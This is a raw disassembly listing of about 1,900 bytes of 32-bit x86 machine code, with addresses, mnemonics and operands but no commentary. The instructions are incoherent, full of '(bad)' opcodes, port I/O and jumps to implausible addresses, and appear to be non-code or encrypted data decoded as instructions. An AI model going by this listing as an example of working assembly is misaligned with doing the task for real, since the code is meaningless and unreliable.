  403970:	mov    edi,DWORD PTR [edx+0x62ab06ed]
  403976:	xor    al,0xfa
  403978:	mov    bl,0x30
  40397a:	mov    ah,0x67
  40397c:	in     eax,0x6e
  40397e:	pusha  
  40397f:	xchg   edi,eax
  403980:	mov    ds:0xc2eaf15e,eax
  403985:	(bad)  
  403986:	push   esi
  403987:	xchg   BYTE PTR [ebp+0x1f],dh
  40398a:	fist   WORD PTR [esi+0x27]
  40398d:	xchg   ecx,eax
  40398e:	mov    bh,0x52
  403990:	dec    esi
  403991:	add    DWORD PTR [edx],0xffffff9b
  403994:	push   ecx
  403995:	imul   ecx,DWORD PTR [ebp-0x336a7bd9],0x21
  40399c:	ins    BYTE PTR es:[edi],dx
  40399d:	bound  ebp,QWORD PTR [eax-0x4a187fba]
  4039a3:	stos   DWORD PTR es:[edi],eax
  4039a4:	sar    DWORD PTR [ecx+0x48],0x0
  4039a8:	loope  0x4039be
  4039aa:	sbb    al,0x5d
  4039ac:	sbb    al,0x55
  4039ae:	ret    0x59c
  4039b1:	mov    al,0x10
  4039b3:	dec    ecx
  4039b4:	push   ebp
  4039b5:	pop    edi
  4039b6:	rol    DWORD PTR [esi+0x66f81c97],cl
  4039bc:	dec    ebx
  4039bd:	std    
  4039be:	xlat   BYTE PTR ds:[ebx]
  4039bf:	retf   0xec78
  4039c2:	(bad)  
  4039c3:	adc    DWORD PTR [ebp+0x12099d9c],ebp
  4039c9:	aam    0xf4
  4039cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039cc:	mov    ebx,0x5bdb2b5
  4039d1:	fwait
  4039d2:	in     eax,0x91
  4039d4:	std    
  4039d5:	mov    ch,ch
  4039d7:	mov    esi,DWORD PTR [edx+0x631f69ef]
  4039dd:	mov    ch,0xec
  4039df:	imul   edx,DWORD PTR [esi-0x44],0x24
  4039e3:	cmp    BYTE PTR [edx+0x77e8f276],cl
  4039e9:	xor    dh,bl
  4039eb:	popf   
  4039ec:	dec    esi
  4039ed:	aad    0x95
  4039ef:	fistp  DWORD PTR [esi+0x7d86dcc1]
  4039f5:	mov    DWORD PTR [edx],esi
  4039f7:	jl     0x403a3f
  4039f9:	push   ebx
  4039fa:	imul   esp,ebp,0x808bf9e4
  403a00:	jp     0x403a29
  403a02:	jb     0x403a51
  403a04:	mov    ah,0x85
  403a06:	sub    esi,DWORD PTR [ecx]
  403a08:	mov    edi,0xc16a2b6b
  403a0d:	adc    eax,0x5441eaf3
  403a12:	lahf   
  403a13:	mov    eax,0x712004f7
  403a18:	cs int3 
  403a1a:	jbe    0x4039b9
  403a1c:	inc    edi
  403a1d:	(bad)  
  403a1e:	xchg   ebx,eax
  403a1f:	jbe    0x403a8b
  403a21:	sbb    ch,BYTE PTR [esi+0x2c9cba1]
  403a27:	jmp    0x403a2a
  403a29:	in     eax,0xf5
  403a2b:	add    ebp,DWORD PTR [edx-0x75]
  403a2e:	xchg   edi,eax
  403a2f:	shl    dl,0xff
  403a32:	ins    BYTE PTR es:[edi],dx
  403a33:	dec    esp
  403a34:	cdq    
  403a35:	out    0x69,al
  403a37:	xor    eax,0xcc655e89
  403a3c:	lods   al,BYTE PTR ds:[esi]
  403a3d:	enter  0x88b1,0x99
  403a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a42:	fdiv   st(7),st
  403a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a45:	fsub   QWORD PTR [esi]
  403a47:	cli    
  403a48:	jmp    0x4039d9
  403a4a:	and    BYTE PTR [eax-0x6cfaffb1],dh
  403a50:	push   eax
  403a51:	in     al,0xb1
  403a53:	push   ebp
  403a54:	hlt    
  403a55:	sbb    al,0x5a
  403a57:	dec    edx
  403a58:	xor    eax,0xfc4becc3
  403a5d:	arpl   WORD PTR [ecx],ax
  403a5f:	(bad)  
  403a60:	fistp  WORD PTR [esi-0x50]
  403a63:	mov    ecx,0x6409b738
  403a68:	out    0x4a,al
  403a6a:	repnz shl BYTE PTR [ebx-0x4dee3ac2],cl
  403a71:	daa    
  403a72:	inc    esi
  403a73:	pop    edx
  403a74:	jmp    DWORD PTR [edi]
  403a76:	mov    DWORD PTR [edx-0x1d52141],edi
  403a7c:	(bad)  
  403a7d:	push   esp
  403a7e:	(bad)  
  403a7f:	dec    edx
  403a80:	(bad)  
  403a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a82:	jle    0x403a76
  403a84:	in     eax,dx
  403a85:	(bad)  
  403a86:	jmp    0x8067:0x4cfdb47d
  403a8d:	(bad)  
  403a8f:	sar    eax,1
  403a91:	jnp    0x403ad5
  403a93:	adc    edi,eax
  403a95:	loopne 0x403ac3
  403a97:	ss push 0x55
  403a9a:	add    BYTE PTR [ebx-0x73],bl
  403a9d:	jecxz  0x403a82
  403a9f:	pop    ebx
  403aa0:	enter  0x2a96,0x23
  403aa4:	mov    dl,0xb1
  403aa6:	sub    ch,BYTE PTR [edi-0x3a]
  403aa9:	mov    dh,0x51
  403aab:	xor    ebx,DWORD PTR [ebx]
  403aad:	push   ds
  403aae:	or     DWORD PTR [edi+0x1d05675f],edi
  403ab4:	fidivr WORD PTR [edi]
  403ab6:	cmp    eax,0xee7a7de1
  403abb:	pop    esi
  403abc:	arpl   WORD PTR [eax+0x1b],di
  403abf:	inc    ecx
  403ac0:	shl    DWORD PTR ds:0xdaf9,0xae
  403ac6:	pop    edi
  403ac7:	outs   dx,BYTE PTR es:[esi]
  403ac9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403acc:	enter  0xf440,0xa5
  403ad0:	cwde   
  403ad1:	cmp    al,0xfb
  403ad3:	jge    0x403b14
  403ad5:	adc    DWORD PTR [edx-0x7e9b6061],ebp
  403adb:	scas   al,BYTE PTR es:[edi]
  403adc:	(bad)  
  403add:	cld    
  403ade:	sub    edi,DWORD PTR ds:[edi]
  403ae1:	and    ebx,DWORD PTR [edi+0x5c]
  403ae4:	or     eax,0x8e958568
  403ae9:	retf   
  403aea:	push   ss
  403aeb:	jno    0x403a76
  403aed:	leave  
  403aee:	cli    
  403aef:	mov    ebp,0x48bb7d6e
  403af4:	push   edi
  403af5:	push   0xfffffff4
  403af7:	mov    eax,DWORD PTR [ebx]
  403af9:	mov    ds:0x74f25ba5,eax
  403afe:	push   edi
  403aff:	(bad)  
  403b00:	pop    ebx
  403b01:	(bad)  
  403b02:	jns    0x403b15
  403b04:	gs dec eax
  403b06:	adc    al,0xb2
  403b08:	cdq    
  403b09:	lock stos DWORD PTR es:[edi],eax
  403b0b:	push   eax
  403b0c:	test   eax,ecx
  403b0e:	pop    ebx
  403b0f:	jno    0x403b59
  403b11:	mov    ecx,0xb32355fd
  403b16:	inc    esp
  403b17:	ss inc esi
  403b19:	mov    ah,BYTE PTR [eax]
  403b1b:	and    eax,esi
  403b1d:	fwait
  403b1e:	addr16 aas 
  403b20:	sub    dh,BYTE PTR [esi+0x13]
  403b23:	(bad)  
  403b24:	push   0xffffff9b
  403b26:	pop    ds
  403b27:	xchg   BYTE PTR [edi+0x4],ch
  403b2a:	clc    
  403b2b:	clc    
  403b2c:	xchg   ebp,eax
  403b2d:	stos   DWORD PTR es:[edi],eax
  403b2e:	in     al,0x6
  403b30:	and    ah,BYTE PTR [ebx+0x41]
  403b33:	daa    
  403b34:	sbb    eax,DWORD PTR [esi+0x710894d8]
  403b3a:	ret    
  403b3b:	sbb    DWORD PTR [ebx],eax
  403b3d:	lds    edi,FWORD PTR [edx]
  403b3f:	mov    bl,0x76
  403b41:	into   
  403b42:	xchg   edi,eax
  403b43:	fwait
  403b44:	xchg   edi,eax
  403b45:	daa    
  403b46:	in     eax,dx
  403b47:	enter  0x7ae5,0x47
  403b4b:	cmp    BYTE PTR [esi+ecx*8-0x2a6f2218],dl
  403b52:	shl    DWORD PTR [ecx+0x29],0x21
  403b56:	iret   
  403b57:	jnp    0x403b51
  403b59:	js     0x403ae9
  403b5b:	aam    0x6a
  403b5d:	mov    ebx,0x511b74e2
  403b62:	rol    edx,1
  403b64:	in     al,dx
  403b65:	xchg   edx,eax
  403b66:	fimul  WORD PTR [ecx]
  403b68:	sbb    dl,BYTE PTR [esi-0x63c344d6]
  403b6e:	adc    al,0x38
  403b70:	jmp    0x403b0a
  403b72:	pop    esp
  403b73:	aad    0x43
  403b75:	pop    ebx
  403b76:	xchg   ebx,eax
  403b77:	ror    BYTE PTR [ebx],cl
  403b79:	xor    esp,DWORD PTR [eax-0x43cd015a]
  403b7f:	fidiv  WORD PTR [ecx+0x16]
  403b82:	sar    dh,0x22
  403b85:	loopne 0x403ba1
  403b87:	repz xor BYTE PTR [edi],bl
  403b8a:	xchg   ecx,eax
  403b8b:	sti    
  403b8c:	pop    eax
  403b8d:	xor    ah,BYTE PTR [eax-0x38]
  403b90:	xlat   BYTE PTR ds:[ebx]
  403b91:	xor    DWORD PTR [edi+0x7f5b1c91],ebp
  403b97:	dec    esp
  403b98:	ins    DWORD PTR es:[edi],dx
  403b99:	add    eax,0x1c6eef8d
  403b9e:	mov    dh,0xd0
  403ba0:	cmp    esp,DWORD PTR [esi]
  403ba2:	in     al,dx
  403ba3:	xchg   edx,eax
  403ba4:	in     eax,dx
  403ba5:	fist   DWORD PTR [eax+ebp*2]
  403ba8:	lahf   
  403ba9:	jnp    0x403b42
  403bab:	cmp    DWORD PTR [edx],edi
  403bad:	cmp    DWORD PTR [ebx],esi
  403baf:	cmp    DWORD PTR [esi],esp
  403bb1:	call   0x922708f1
  403bb6:	pop    esp
  403bb7:	mov    ds:0xabec0e6,eax
  403bbc:	sub    DWORD PTR [ebp-0x1508f043],ebp
  403bc2:	mov    ah,0xd
  403bc4:	test   edx,edi
  403bc6:	ds push esi
  403bc8:	adc    esp,ecx
  403bca:	and    ecx,DWORD PTR [ebp+eiz*4-0x56280991]
  403bd1:	jns    0x403b69
  403bd3:	jae    0x403c44
  403bd5:	jmp    FWORD PTR [ebx-0x6aaa246c]
  403bdb:	mov    bh,0x15
  403bdd:	inc    esi
  403bde:	dec    ebp
  403bdf:	dec    edi
  403be0:	inc    esi
  403be1:	popf   
  403be2:	leave  
  403be3:	cdq    
  403be4:	je     0x403bb9
  403be6:	push   ebp
  403be7:	adc    eax,0x2de233f0
  403bec:	dec    edx
  403bed:	dec    ebp
  403bee:	into   
  403bef:	scas   al,BYTE PTR es:[edi]
  403bf0:	mov    bl,0x33
  403bf2:	jo     0x403c17
  403bf4:	xchg   ebp,eax
  403bf5:	pop    ss
  403bf6:	mov    bh,0xb7
  403bf8:	stc    
  403bf9:	push   ds
  403bfa:	jae    0x403c32
  403bfc:	and    DWORD PTR [ebp+0x4b],ecx
  403bff:	pop    edx
  403c00:	ja     0x403bb9
  403c02:	repnz xchg edx,eax
  403c04:	into   
  403c05:	sbb    DWORD PTR [eax+0x11e33a62],esi
  403c0b:	push   ds
  403c0c:	push   edi
  403c0d:	sahf   
  403c0e:	ss sub bh,BYTE PTR cs:[esi]
  403c12:	imul   edi,DWORD PTR [edx+0x6dba8b9d],0x71334c79
  403c1c:	scas   al,BYTE PTR es:[edi]
  403c1d:	rcr    ch,cl
  403c1f:	cmp    DWORD PTR [esi],esi
  403c21:	leave  
  403c22:	cmp    BYTE PTR [ebx-0x46],bh
  403c25:	ins    BYTE PTR es:[edi],dx
  403c26:	jne    0x403c79
  403c28:	int3   
  403c29:	test   eax,0xb862d81c
  403c2e:	xchg   ebx,eax
  403c2f:	push   ss
  403c30:	mov    eax,ds:0x23c2fcb5
  403c35:	lods   eax,DWORD PTR ds:[esi]
  403c36:	dec    ecx
  403c37:	xchg   ebp,eax
  403c38:	add    DWORD PTR [eax],ecx
  403c3a:	out    0x8e,al
  403c3c:	scas   eax,DWORD PTR es:[edi]
  403c3d:	mov    ebp,0xa620b332
  403c42:	mov    edi,0xe525cdb9
  403c47:	test   al,0x6
  403c49:	pop    edx
  403c4a:	popa   
  403c4b:	outs   dx,DWORD PTR ds:[esi]
  403c4c:	dec    edx
  403c4d:	ja     0x403c0e
  403c4f:	daa    
  403c50:	sub    ebp,esi
  403c52:	cmc    
  403c53:	ins    DWORD PTR es:[edi],dx
  403c54:	sbb    ebp,DWORD PTR [edx-0x5]
  403c57:	lods   eax,DWORD PTR ds:[esi]
  403c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c59:	fist   DWORD PTR [esi-0x339e3c93]
  403c5f:	daa    
  403c60:	addr16 mov dh,0x23
  403c63:	dec    esp
  403c64:	jns    0x403c16
  403c66:	aas    
  403c67:	lahf   
  403c68:	clc    
  403c69:	adc    DWORD PTR [esi+0x120810ec],edi
  403c6f:	cmp    al,0xe9
  403c71:	es add eax,0x5f09db65
  403c77:	cmp    DWORD PTR [esi+0x30],esi
  403c7a:	push   edx
  403c7b:	out    dx,al
  403c7c:	xor    cl,bl
  403c7e:	pop    ds
  403c7f:	and    al,0xa
  403c81:	and    DWORD PTR [esp+ebp*2+0x5dc504a8],0x9b145915
  403c8c:	add    DWORD PTR ds:0x12948862,ebp
  403c92:	imul   ebx,DWORD PTR [ebx+0x66],0x5acaef1
  403c99:	retf   
  403c9a:	push   ss
  403c9b:	pop    edi
  403c9c:	in     al,dx
  403c9d:	cmp    dh,BYTE PTR [eax+ebp*4+0x6cc23f42]
  403ca4:	adc    ecx,DWORD PTR [esi]
  403ca6:	jb     0x403ce0
  403ca8:	push   ecx
  403ca9:	mov    edx,0x9244af24
  403cae:	into   
  403caf:	test   eax,0x4e27c191
  403cb4:	dec    esp
  403cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb6:	dec    esp
  403cb7:	test   BYTE PTR [ebp-0x1a90ca4],ah
  403cbd:	in     al,0xbd
  403cbf:	ds add eax,0x6a51368e
  403cc5:	shl    DWORD PTR ds:0x952712da,0xaf
  403ccc:	xor    ah,BYTE PTR [edx+0x15a8f04e]
  403cd2:	bound  ebx,QWORD PTR [edi-0x71e10491]
  403cd8:	pop    ebx
  403cd9:	sbb    BYTE PTR [ebx-0x3a],bl
  403cdc:	test   BYTE PTR [eax+edi*1+0x640fab8b],ch
  403ce3:	add    BYTE PTR [edx-0x56665018],bl
  403ce9:	adc    BYTE PTR [ebx+esi*4-0x6f],ch
  403ced:	or     al,0x1a
  403cef:	mov    edi,0x7e816f33
  403cf4:	push   ebp
  403cf5:	nop
  403cf6:	mov    ds:0x2b592087,eax
  403cfb:	addr16 in al,dx
  403cfd:	xor    dh,bh
  403cff:	inc    edi
  403d00:	xor    ebx,ebx
  403d02:	xlat   BYTE PTR ds:[ebx]
  403d03:	push   esp
  403d04:	mov    DWORD PTR [ecx-0x35],eax
  403d07:	pop    edi
  403d08:	jae    0x403d4a
  403d0a:	inc    bh
  403d0c:	push   0x7b9010ec
  403d11:	test   BYTE PTR [ecx],0xc0
  403d14:	pop    es
  403d15:	test   eax,0x6651cb88
  403d1a:	sbb    al,0x0
  403d1c:	inc    ebp
  403d1d:	adc    ah,ch
  403d1f:	inc    ebp
  403d20:	aaa    
  403d21:	sbb    cl,BYTE PTR [ecx]
  403d23:	xor    BYTE PTR [ecx+0x69],0x6d
  403d27:	jnp    0x403da6
  403d29:	mov    edx,0xc6dd6e54
  403d2e:	fisub  DWORD PTR [edi+ecx*4+0xb]
  403d32:	lods   eax,DWORD PTR gs:[esi]
  403d34:	sbb    dh,BYTE PTR [edi]
  403d36:	(bad)  
  403d37:	cmp    DWORD PTR [ecx],ebx
  403d39:	mov    cl,0x6a
  403d3b:	dec    eax
  403d3c:	imul   esi,DWORD PTR [ebx-0x6c1a32c6],0xffffffcb
  403d43:	cmp    bh,BYTE PTR [esp+esi*8+0x37]
  403d47:	push   edi
  403d48:	xor    esp,ebx
  403d4a:	xlat   BYTE PTR ds:[ebx]
  403d4b:	pop    edx
  403d4c:	shl    DWORD PTR [eax-0x3dc9e450],cl
  403d52:	or     DWORD PTR [esi-0x71],0x8d5cf157
  403d59:	sub    dh,bh
  403d5b:	or     DWORD PTR [edx+0x752f1c4],esp
  403d61:	jmp    0x403d81
  403d63:	cld    
  403d64:	pop    ds
  403d65:	loop   0x403cf6
  403d67:	dec    esi
  403d68:	mov    ss,edx
  403d6a:	push   esp
  403d6b:	push   ds
  403d6c:	mov    eax,ds:0x4fddabf2
  403d71:	ficomp WORD PTR ds:0x2f7e4b01
  403d77:	xchg   ebp,eax
  403d78:	lds    esi,FWORD PTR [eax]
  403d7a:	xchg   BYTE PTR [ebx],dh
  403d7c:	pop    ecx
  403d7d:	(bad)  
  403d7f:	mov    ebx,DWORD PTR [bx]
  403d82:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d84:	xchg   BYTE PTR ss:[eax+0x3b],bl
  403d88:	xchg   BYTE PTR [ebx],al
  403d8a:	loop   0x403dcb
  403d8c:	fcmovbe st,st(4)
  403d8e:	dec    edx
  403d8f:	sahf   
  403d90:	xchg   ebp,eax
  403d91:	xor    edi,esp
  403d93:	dec    esp
  403d94:	clc    
  403d95:	dec    esi
  403d96:	(bad)  
  403d98:	pop    es
  403d99:	(bad)  
  403d9a:	fadd   st(0),st
  403d9c:	das    
  403d9d:	outs   dx,BYTE PTR ds:[esi]
  403d9e:	push   DWORD PTR [eax+0x1bef523c]
  403da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da5:	jmp    0x7b99:0xf7ef049f
  403dac:	mov    al,ds:0x3fb7dcd0
  403db1:	test   BYTE PTR [esi+0x2b],ch
  403db4:	jmp    0x403e06
  403db6:	jl     0x403db3
  403db8:	das    
  403db9:	adc    al,ch
  403dbb:	xor    edi,DWORD PTR [ecx-0x11a0bb7c]
  403dc1:	ds dec ecx
  403dc3:	fistp  DWORD PTR [esi-0x22d83b05]
  403dc9:	mov    ebp,0x8a788cb1
  403dce:	enter  0x6dbc,0x87
  403dd2:	jb     0x403e3f
  403dd4:	xor    DWORD PTR [edx+0x2e],esp
  403dd7:	mov    ebp,DWORD PTR [ecx-0x7f]
  403dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ddb:	mov    bh,0xd3
  403ddd:	popa   
  403dde:	iret   
  403ddf:	out    0xda,al
  403de1:	in     eax,dx
  403de2:	or     al,dh
  403de4:	sbb    DWORD PTR [ebx-0x2f6f041a],eax
  403dea:	jns    0x403dfe
  403dec:	push   esi
  403ded:	xlat   BYTE PTR ds:[ebx]
  403dee:	jl     0x403dfd
  403df0:	pop    es
  403df1:	push   es
  403df2:	rol    cl,0xf0
  403df5:	pop    ebx
  403df6:	mov    DWORD PTR [edi],esi
  403df8:	rol    BYTE PTR [ebp+esi*2-0x5c159b71],1
  403dff:	js     0x403e1b
  403e01:	pushf  
  403e02:	addr16 xchg esi,eax
  403e04:	sbb    eax,0xfea8ad7a
  403e09:	adc    DWORD PTR [ebx+0x7f],ecx
  403e0c:	repnz push eax
  403e0e:	js     0x403e0b
  403e10:	xchg   edx,eax
  403e11:	mov    WORD PTR [ebx-0x10],es
  403e14:	xor    DWORD PTR [ebx],eax
  403e16:	mov    ebx,0x7e50c2f5
  403e1b:	and    eax,0xa1613124
  403e20:	cmp    al,0x97
  403e22:	push   edx
  403e23:	enter  0x44a6,0xb2
  403e27:	xor    dh,BYTE PTR [ebp+0x7167c4d2]
  403e2d:	popf   
  403e2e:	mov    bh,ch
  403e30:	mov    cl,0x95
  403e32:	lock fs shl cl,0x5d
  403e37:	fbstp  TBYTE PTR [ebx-0x64bc44c5]
  403e3d:	rcr    DWORD PTR [esi+0x57],1
  403e40:	pop    ss
  403e41:	adc    dh,BYTE PTR [esp+ebx*4-0x2c]
  403e45:	xchg   esp,eax
  403e46:	xor    bh,bl
  403e48:	test   eax,0x76520db3
  403e4d:	adc    al,0x64
  403e4f:	adc    BYTE PTR [ebp-0x70f98af4],bl
  403e55:	push   ss
  403e56:	cmp    edx,esi
  403e58:	jne    0x403e40
  403e5a:	push   ebx
  403e5b:	push   ecx
  403e5c:	retf   0xeb32
  403e5f:	into   
  403e60:	dec    edi
  403e61:	add    dl,BYTE PTR [ebx+0x37]
  403e64:	inc    esi
  403e65:	xor    al,0x15
  403e67:	dec    esp
  403e68:	pop    ds
  403e69:	hlt    
  403e6a:	lahf   
  403e6b:	mov    dl,0xc0
  403e6d:	jne    0x403e23
  403e6f:	outs   dx,BYTE PTR ds:[esi]
  403e70:	or     ecx,DWORD PTR [esi-0x3f]
  403e73:	add    ah,BYTE PTR [ebx-0x5e]
  403e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e77:	and    eax,0x8075a7ef
  403e7c:	icebp  
  403e7d:	mov    ecx,0x150cf8d8
  403e82:	sub    cl,al
  403e84:	pop    ecx
  403e85:	jbe    0x403e64
  403e87:	jo     0x403ef1
  403e89:	mov    bh,0x39
  403e8b:	or     BYTE PTR [esi+0x25],dl
  403e8e:	fcomp  DWORD PTR [eax]
  403e90:	retf   
  403e91:	popa   
  403e92:	shr    DWORD PTR [edi+0x43],0x9e
  403e96:	fisttp DWORD PTR [edi]
  403e98:	push   cs
  403e99:	pop    esp
  403e9a:	pop    ds
  403e9b:	dec    edi
  403e9c:	fbstp  TBYTE PTR fs:[ebp-0x615f2a12]
  403ea3:	cmc    
  403ea4:	jmp    0x403e4c
  403ea6:	dec    ebp
  403ea7:	push   ecx
  403ea8:	push   edx
  403ea9:	inc    esi
  403eaa:	sub    ebx,esi
  403eac:	aas    
  403ead:	dec    edx
  403eae:	dec    edi
  403eaf:	stos   DWORD PTR es:[edi],eax
  403eb0:	xchg   edi,eax
  403eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eb2:	(bad)  
  403eb4:	pop    es
  403eb5:	jg     0x403e9f
  403eb7:	jg     0x403e41
  403eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eba:	inc    eax
  403ebb:	push   ds
  403ebc:	fist   DWORD PTR [edi*2-0x13dc7bef]
  403ec3:	in     al,0xf2
  403ec5:	jns    0x403ee1
  403ec7:	jecxz  0x403e74
  403ec9:	dec    ebx
  403eca:	and    al,0x52
  403ecc:	add    ecx,DWORD PTR [edi-0x7b]
  403ecf:	cli    
  403ed0:	pusha  
  403ed1:	(bad)  
  403ed2:	addr16 pushf 
  403ed4:	je     0x403eeb
  403ed6:	jecxz  0x403eff
  403ed8:	es mov dh,0xc7
  403edb:	ret    0xaa0
  403ede:	and    eax,0x24bd9821
  403ee3:	arpl   WORD PTR ds:0x527df93f,bp
  403ee9:	inc    esp
  403eea:	pop    ss
  403eeb:	mov    ah,0x3f
  403eed:	imul   esi,edx,0xffffff89
  403ef0:	sbb    bh,BYTE PTR [eax]
  403ef2:	cmp    dh,cl
  403ef4:	jne    0x403f4c
  403ef6:	sub    al,0xff
  403ef8:	fwait
  403ef9:	push   ss
  403efa:	lea    esp,[ebx+0x73]
  403efd:	lahf   
  403efe:	test   al,0xf7
  403f00:	push   0x2b2f0a7b
  403f05:	and    eax,0x3eaf1156
  403f0a:	mov    ss,WORD PTR [edx-0x76]
  403f0d:	mov    eax,ds:0x4657b957
  403f12:	jmp    0xec68ae0c
  403f17:	test   BYTE PTR [edx-0x69],ah
  403f1a:	cmp    DWORD PTR [edx+ebp*1],eax
  403f1d:	cmp    DWORD PTR [ebx-0x47eda0f0],edx
  403f23:	push   eax
  403f24:	iret   
  403f25:	inc    esp
  403f26:	out    dx,eax
  403f27:	loope  0x403eb1
  403f29:	xor    cl,dh
  403f2b:	jb     0x403eb4
  403f2d:	retf   0xe141
  403f30:	and    DWORD PTR [ebx+0xd],ecx
  403f33:	in     eax,0xf2
  403f35:	ror    DWORD PTR [ebx-0x51],0x9d
  403f39:	sahf   
  403f3a:	aaa    
  403f3b:	ins    BYTE PTR es:[edi],dx
  403f3c:	jmp    0x20eb7a09
  403f41:	loope  0x403f16
  403f43:	jp     0x403ee7
  403f45:	in     al,dx
  403f46:	jle    0x403f67
  403f48:	push   esp
  403f49:	test   eax,0xd1d8e2ce
  403f4e:	sub    esi,ecx
  403f50:	test   DWORD PTR fs:[ebx],ebp
  403f53:	and    eax,0x5355368c
  403f58:	inc    ebx
  403f59:	add    dh,dh
  403f5b:	and    bl,ch
  403f5d:	retf   0x4616
  403f60:	pop    eax
  403f61:	and    DWORD PTR [edx-0x26d319ba],ebp
  403f67:	mov    al,0x6f
  403f69:	test   DWORD PTR [eax+edi*2+0x5afb1d34],ebp
  403f70:	mov    ch,BYTE PTR gs:[ebx+eax*4+0x5ae52845]
  403f78:	xchg   BYTE PTR [edx-0x1e],ch
  403f7b:	hlt    
  403f7c:	jno    0x403fda
  403f7e:	mov    ebp,0xdd265c16
  403f83:	or     BYTE PTR [eax+0x52a0754],dh
  403f89:	shl    BYTE PTR [bx+si-0x5],1
  403f8d:	inc    esi
  403f8e:	loop   0x403f45
  403f90:	xor    bl,bh
  403f92:	imul   edx,DWORD PTR [edi-0x16],0x62
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	mov    DWORD PTR [eax+esi*4-0x3d],edx
  403f9b:	fadd   QWORD PTR [ecx-0x2de50c77]
  403fa1:	add    edx,DWORD PTR [ecx-0x6c]
  403fa4:	mov    ebx,0xca54310a
  403fa9:	or     al,0x3e
  403fab:	call   0x511d:0xf8956af9
  403fb2:	pop    edi
  403fb3:	cmp    DWORD PTR [ecx+0x43],esi
  403fb6:	push   ecx
  403fb7:	(bad)  
  403fb8:	nop
  403fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fba:	sbb    eax,0x4b92ceef
  403fbf:	adc    BYTE PTR [esi],0x65
  403fc2:	inc    eax
  403fc3:	repnz cdq 
  403fc5:	cld    
  403fc6:	sub    BYTE PTR [eax],bh
  403fc8:	cmovns edx,DWORD PTR [esi-0x29b80fda]
  403fcf:	std    
  403fd0:	dec    edi
  403fd1:	mov    esp,0xc9d50ca1
  403fd6:	es xchg esi,eax
  403fd8:	stos   DWORD PTR es:[edi],eax
  403fd9:	xor    al,0x73
  403fdb:	dec    esp
  403fdc:	mov    esi,0xe395b57c
  403fe1:	or     esi,DWORD PTR ds:0xd7f2ab4d
  403fe7:	out    dx,al
  403fe8:	das    
  403fe9:	jp     0x403fd7
  403feb:	ja     0x403fa5
  403fed:	or     al,0x7
  403fef:	dec    DWORD PTR [edi-0x4b]
  403ff2:	test   eax,0xf300774f
  403ff7:	xchg   BYTE PTR [edi],bl
  403ff9:	push   cs
  403ffa:	jbe    0x403f7c
  403ffc:	ds mov dh,0x31
  403fff:	sbb    ch,ah
  404001:	or     DWORD PTR ds:0x70a84b2e,edx
  404007:	dec    esp
  404008:	mov    ebp,ecx
  40400a:	std    
  40400b:	lock dec BYTE PTR [edx]
  40400e:	cdq    
  40400f:	in     eax,dx
  404010:	pop    esi
  404011:	retf   
  404012:	push   cs
  404013:	cmp    dl,BYTE PTR [edi-0x63747111]
  404019:	push   ebp
  40401a:	in     eax,dx
  40401b:	fisubr WORD PTR [ebp+0x6d]
  40401e:	cmp    eax,0x5846b75d
  404023:	pop    edx
  404024:	and    eax,0x5048a912
  404029:	jle    0x4040a2
  40402b:	hlt    
  40402c:	adc    eax,0x981f875c
  404031:	aam    0xf8
  404033:	dec    esp
  404034:	mov    dh,0x4a
  404036:	stc    
  404037:	stos   DWORD PTR es:[edi],eax
  404038:	and    al,0x2e
  40403a:	in     al,0x7d
  40403c:	out    0x47,eax
  40403e:	call   0xd3f0:0x65b8b938
  404045:	mov    eax,0xe714ac5d
  40404a:	in     eax,dx
  40404b:	xor    dh,bl
  40404d:	xor    ch,bl
  40404f:	pop    ebx
  404050:	xchg   esi,ecx
  404052:	in     eax,dx
  404053:	sbb    DWORD PTR [edi-0x75],0xfffffffd
  404057:	(bad)  [eax]
  404059:	inc    ebp
  40405a:	loope  0x404000
  40405c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40405d:	sbb    bh,BYTE PTR [esi+0x14a03eb]
  404063:	and    eax,DWORD PTR [edx+0x5cf3d173]
  404069:	in     eax,dx
  40406a:	cmp    BYTE PTR [esi+eax*2-0x4a0e0593],0x20
  404072:	dec    esp
  404073:	cdq    
  404074:	inc    edi
  404075:	pop    es
  404076:	out    0x83,al
  404078:	fxch   st(6)
  40407a:	mov    ds:0x9088b469,eax
  40407f:	test   al,0xeb
  404081:	lea    edi,[edi-0x38]
  404084:	mov    edx,0x38aaada0
  404089:	leave  
  40408a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40408b:	pop    ecx
  40408c:	into   
  40408d:	jle    0x40401f
  40408f:	(bad)  
  404090:	sti    
  404091:	call   0xb82a:0x89d8120c
  404098:	push   edx
  404099:	jge    0x404114
  40409b:	mov    ebx,0x12d1540d
  4040a0:	aam    0x51
  4040a2:	les    ecx,FWORD PTR [eax-0x3c]
  4040a5:	add    esi,DWORD PTR [esp+edi*1]
  4040a8:	retf   0x3b2d
  4040ab:	mov    dh,BYTE PTR [esi]
  4040ad:	lods   eax,DWORD PTR ds:[esi]
  4040ae:	mov    ds:0x99a8c983,eax
  4040b3:	xor    esp,edx
  4040b5:	mov    ah,0xa4
  4040b7:	adc    eax,0xd047b9ca
  4040bc:	enter  0x67ae,0x89
  4040c0:	data16 fisttp WORD PTR [ecx-0xc25da98]
  4040c7:	adc    esi,DWORD PTR [ebp-0x3c0929f]
  4040cd:	push   esi
  4040ce:	adc    eax,0xb9dfd0e
  4040d3:	or     eax,DWORD PTR [eax+0x55149751]
  4040d9:	xlat   BYTE PTR ds:[ebx]
  4040da:	sbb    esi,DWORD PTR [eax+0x48]
  4040dd:	lahf   
